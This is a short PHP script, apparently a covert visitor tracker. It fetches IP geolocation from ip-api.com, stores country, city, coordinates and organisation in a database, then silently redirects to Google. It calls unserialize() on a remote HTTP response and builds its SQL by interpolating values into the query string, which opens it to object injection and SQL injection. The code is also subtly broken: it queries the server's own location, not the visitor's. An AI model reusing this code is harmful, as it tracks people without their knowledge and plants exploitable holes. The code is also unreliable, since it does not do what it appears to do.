<?php
 require_once 'db.php';
 require_once 'class/Cliente.php'; 
  $usuario = @unserialize(file_get_contents('http://ip-api.com/php'));

 if ($usuario['status'] == 'success') {
 	 $cliente = new Cliente($usuario['query'],$usuario['country'],$usuario['regionName'],$usuario['city'],$usuario['zip'],$usuario['lat'],$usuario['lon'],$usuario['org']);

 	 $pdo = $db->prepare("INSERT INTO cliente SET 
        ip = '$cliente->ip',
        pais = '$cliente->pais',
        estado = '$cliente->estado',
        cidade = '$cliente->cidade',
        cep = '$cliente->cep',
        latitude = '$cliente->latitude',
        longitude = '$cliente->longitude',
        empresa = '$cliente->empresa'
 	 	");
 	 $pdo->execute();
     
     header("Location: https://google.com");
 }else{
 	echo 'Ocorreu um erro';
 }
